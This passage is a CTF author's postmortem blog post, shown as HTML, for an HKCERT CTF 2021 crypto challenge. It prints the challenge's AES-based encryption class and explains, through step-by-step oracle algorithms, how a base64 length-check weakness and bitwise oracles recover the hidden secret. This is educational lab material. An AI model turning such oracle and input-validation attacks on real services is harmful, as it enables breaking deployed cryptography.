+<li><strong>[Multiplication]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a\cdot b\ \text{mod}\ p)$.</li>
+<li><strong>[Power]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a^b\ \text{mod}\ p)$.</li>
+<li><strong>[Bitwise And]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a \land b\ \text{mod}\ p)$.</li>
+<li><strong>[Bitwise Or]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a\lor b\ \text{mod}\ p)$.</li>
+<li><strong>[Attempt]</strong> Given $x_0$, returns the flag if $x = x_0$ (i.e., the secret is correct).</li>
+</ol>
+<p>The encryption function, $\text{Enc}$, is defined below. User shall pass a 88-character long (the length is checked) string, $\text{Enc}(a)$, and the string will be decoded in base64 before passing to <code>NumberEncryptor</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">NumberEncryptor</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bits</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="n">bits</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">number</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">key</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">number</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">bits</span><span class="o">//</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">c</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">key</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">c</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="motivation-1">Motivation<a href="#motivation-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Inspired by <a href="/posts/2021/2021-05-04-defcon-quals-1/#side-story-creating-a-crypto-challenge"
+   
+   ><em>nooombers</em> in <em>DEFCON CTF 2021 Quals</em></a> but the source code is given.</p>
+<h3 id="solution-2">Solution<a href="#solution-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="constructing-textenc0-and-textenc1">Constructing $\text{Enc}(0)$ and $\text{Enc}(1)$<a href="#constructing-textenc0-and-textenc1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>The below algorithm, $\mathcal{A}_0$, is one way to construct $\text{Enc}(0$):</p>
+<ol>
+<li>Generate 64 bytes randomly (denoted as $x$).</li>
+<li>Generate 64 bytes randomly (denoted as $r$). Use <em>bitwise and</em> and update $x \leftarrow \text{Enc}(x \land r\ \text{mod}\ p)$.</li>
+<li>Repeat step 2 until $x$ is fixed. In that case, it is likely that $x = \text{Enc}(0)$.</li>
+</ol>
+<p>There is a better way. Let's introduce a major weakness.</p>
+<div class="alert danger">
+  <strong>Weakness.</strong> The server only checks if the base64-encoded $\text{Enc}(a)$ has a length of 88. The characters outside the base64 charset will be dropped. With that said, we can send ciphertexts those are shorter than 64.
+</div>
+
+<p>To utilize the weakness, we can pass 88 <code>~</code>'s and it would decode into <code>b''</code>. Also, <code>number_encryptor.decrypt(b'') == 0</code>. That said, we can construct $\text{Enc}(0)$ without using the oracle. This is a <em>dirty zero</em> because it is not the $\text{Enc}(0)$ created by the oracle, which is needed in later parts of the game. Well, we can simply obtain $\text{Enc}(0)$ using <code>AND [88 ~'s] [88 ~'s]</code>. It is then evident to construct $\text{Enc}(1)$: <code>POW [ZERO] [ZERO]</code>. Now we can construct both in two oracle calls.</p>
+<div class="alert warning">
+  <strong>Confession of a math guy.</strong> I know $0^0$ is mathematically undefined. However they said $0^0 = 1$ in Python... Let's stick to that.
+</div>
+
+<h4 id="constructing-textenc2">Constructing $\text{Enc}(2)$<a href="#constructing-textenc2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<div class="alert warning">
+  <strong>A sidenote.</strong> I can only construct $\text{Enc}(4)$ while I was testing the challenge. I shared the problem to <a href="https://twitter.com/harrier_lcc" target="_blank" rel="nofollow">@harrier_lcc</a> and he could construct two probabilistically. Good that I don't need to make it easier to accommodate my level.
+</div>
+
+<p><a href="https://twitter.com/harrier_lcc" target="_blank" rel="nofollow">@harrier_lcc</a> suggested a way to craft $\text{Enc}(2)$. The idea is similar to the algorithm $\mathcal{A}_0$ specified below. Let's call it $\mathcal{A}_1$:</p>
+<ol>
+<li>Generate 64 bytes randomly (denoted as $x$).</li>
+<li>Generate 64 bytes randomly (denoted as $r$). Compute $u \leftarrow \text{Enc}(x \land r\ \text{mod}\ p)$ (via <code>AND</code>). If $u \neq \text{Enc}(0)$, we set $x \leftarrow u$.</li>
+<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(2^k)$ for some $k = 0, 1, ..., 511$ (i.e., $z$ has one set bit).</li>
+</ol>
+<p>This is clever. The <em>bitwise and</em> oracle can be used to find sequence of decreasing Hamming distance. However, even if $x = \text{Enc}(2^k)$, the probability for $x = \text{Enc}(2)$ is only $1/512$. How could we improve the algorithm? We can make use of the weakness - we can send a 88-character long string that decodes into 16 bytes after base64 decoding. Here comes the improved $\mathcal{A}_1$, denoted by $\mathcal{A}_1^+$:</p>
+<ol>
+<li>Generate <strong>16</strong> bytes randomly (denoted as $x$).</li>
+<li>Generate <strong>16</strong> bytes randomly (denoted as $r$). Compute $u \leftarrow \text{Enc}(x \land r\ \text{mod}\ p)$ (via <code>AND</code>). If $u \neq \text{Enc}(0)$, we set $x \leftarrow u$.</li>
+<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(2^k)$ for some $k = 0, 1, ..., 127$.</li>
+</ol>
+<p>Now the probability is increased to $1/128$. We can run the algorithm multiple times to get $x = \text{Enc}(2)$... But wait, how do we confirm that $x = \text{Enc}(2)$? Good that I was able to make $\text{Enc}(4)$. After all, we can check by using <code>MUL [TWO?] [TWO?]</code>.</p>
+<p>We need to construct $\text{Enc}(2^{128}-2)$ for $\text{Enc}(4)$. We can adopt a similar algorithm in $\mathcal{A}_1^+$, let's call it $\mathcal{A}_2$:</p>
+<ol>
+<li>Generate 16 bytes randomly (denoted as $x$).</li>
+<li>Generate 16 bytes randomly (denoted as $r$). Compute $u \leftarrow \text{Enc}(x \lor r\ \text{mod}\ p)$ (via <code>OR</code>). If $\text{Enc}(u \land 1) = \text{Enc}(0)$, then we set $x \leftarrow u$.</li>
+<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(2^{128}-2)$.</li>
+</ol>
+<p>With that, we can construct $\text{Enc}(4)$ by:</p>
+<ol>
+<li><code>MUL [2^128-2] [2^128-2]</code> (returns $\text{Enc}(2^{256} - 2^{129} + 4)$)</li>
+<li><code>AND [2^256-2^129+4] [2^128-2]</code> (returns $\text{Enc}(4)$)</li>
+</ol>
+<div class="alert success">
+  <strong>Congratulations! &#x1f389;</strong> You have survived the hardest part of the challenge. The remaining parts would be straight forward.
+</div>
+
+<h4 id="recovering-p">Recovering $p$<a href="#recovering-p" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>From $\text{Enc}(1)$ and $\text{Enc}(2)$, we are able to construct $\text{Enc}(2^2)$, $\text{Enc}(2^3)$, ... $\text{Enc}(2^{511})$ by <code>MUL</code>. We can use the below algorithm $\mathcal{A}_3$ to recover $p$ (not $\text{Enc}(p)$):</p>
+<ol>
+<li>Initiate $p \leftarrow 1$ and $x \leftarrow \text{Enc}(0)$.</li>
+<li>For $i = 511, 510, ..., 1$, do the following:
+<ul>
+<li>Compute $x' \leftarrow \text{Enc}(x \lor 2^i\ \text{mod}\ p)$ (via <code>OR</code>). Denote $u := x \lor 2^i\ \text{mod}\ p$.</li>
+<li>If $\text{Enc}(u \land 1\ \text{mod}\ p) = \text{Enc}(0)$, then set $x \leftarrow x'$ and update $p \leftarrow p + 2^i$.</li>
+</ul>
+</li>
+</ol>
+<div class="alert info">
+  <strong>Why does the algorithm work?</strong> It is based on the below theorem: Suppose that $p$ is a 512-bit prime and $n \in [0, 2^{512})$ is even. Then $n\ \text{mod}\ p$ is odd if and only if $n \leq p$.
+</div>
+
+<h4 id="recovering-x-oplus-p">Recovering $x \oplus p$<a href="#recovering-x-oplus-p" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>This part is easy. We can recover $x \oplus p$ by running the below algorithm, $\mathcal{A}_4$:</p>
+<ol>
+<li>Initiate $s \leftarrow 0$.</li>
+<li>For $i = 0, 1, ..., 511$, do the following:
+<ul>
+<li>Compute $x' \leftarrow \text{Enc}(x \land 2^i\ \text{mod}\ p)$ (via <code>AND</code>).</li>
+<li>If $x' \neq \text{Enc}(0)$, then set $s \leftarrow s + 2^i$.</li>
+</ul>
+</li>
+</ol>
+<p>From here, we can compute the secret $x$ from $x \oplus p$ and $p$. Finally we can get the flag using <code>ATTEMPT</code>.</p>
+
+        </div></div>
+
+      
+      <aside class="toc-container">
+        <a href="#" class="toc-title-link">
+          HKCERT CTF 2021 Postmortem (IV): The Remaining Ones
+        </a>
+        <div class="js-toc"></div>
+      </aside>
+      
+
+      
+      <div class="py-3">
+        
+          <a class="btn" href="/posts/2021/2021-11-27-balsn-dlog/">← Balsn CTF 2021: dlog</a>
+        
+
+        
+          <a class="btn float-end" href="/posts/2021/2021-11-18-hkcert-ctf-3/">HKCERT CTF 2021 Postmortem (III): The Reverse Challenges →</a>
+        
+      </div>
+      
+
+    </div>
+  </div>
+
+    </div>
+  </main>
+  <div class="container">
+  <footer class="py-3 my-4 border-top">
+    <p class="text-center text-body-secondary">&copy; 2025 Powered by <em>Hugo</em>. Theme crafted by <em>Mystiz</em> with Bootstrap 5, inspired from <em>Terminal</em>.</p>
+  </footer>
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.css"
+  integrity="sha384-Pu5+C18nP5dwykLJOhd2U4Xen7rjScHN/qusop27hdd2drI+lL5KvX7YntvT8yew" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.js"
+  integrity="sha384-2B8pfmZZ6JlVoScJm/5hQfNS2TI/6hPqDZInzzPc8oHpN5SgeNOf4LzREO6p5YtZ" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/contrib/auto-render.min.js"
+  integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/@viz-js/viz@3.24.0/dist/viz-global.min.js"></script>
+<script>
+Viz.instance().then(viz => {
+  const unescape = function (s) {
+    const t = s.replace(/&amp;/g, '&')
+    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
+  }
+
+  document.querySelectorAll('[class=graphviz]').forEach(node => {
+    const source = unescape(node.innerText);
+    console.log(source);
+    const svg = viz.renderSVGElement(source, { engine: 'dot' });
+    console.log(2);
+    node.parentNode.appendChild(svg);
+    node.style.display = 'none';
+  });
+});
+</script>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js"
+  integrity="sha512-BZUSsJAPNtkd+kdY/bD7hvQKZ5zlgWt++KGy/Pa/5uEJNgs0jZ6JaX6MuclRUanowuxmhb5S3LRPEa3QmrUVfA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.css"
+  integrity="sha512-/ANQiHMqpRl+E0zEAd250N21OOmJsYbhiJWY0Y8yG0TII47yZn1+gDNobMlf+h/FTyImprLXYgXbX3bCYyq/vg==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<script type="text/javascript">
+tocbot.init({
+  headingSelector: 'h1, h2, h3, h4',
+  orderedList: false,
+  collapseDepth: 2,
+  headingsOffset: 60,
+  scrollSmoothOffset: -60
+})
+</script>
+
+
+<script>
+  document.querySelectorAll('pre code').forEach(el => {
+    console.log(el)
+    const lang = Array.from(el.classList).find(className => className.startsWith('language-'));
+    if (!lang) return;
+
+    
+    if (lang.startsWith('language-diff-')) {
+      el.classList.add('diff-highlight');
+    }
+  })
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+mermaid.initialize({
+  startOnLoad: true,
+  htmlLabels: true,
+  securityLevel: "loose",
+  theme: 'base',
+  themeVariables: {
+    background: '#22222c',
+    primaryColor: '#33333c',
+    primaryTextColor: '#ffe4e1',
+  }
+});
+</script>
+
+</body>
+</html>
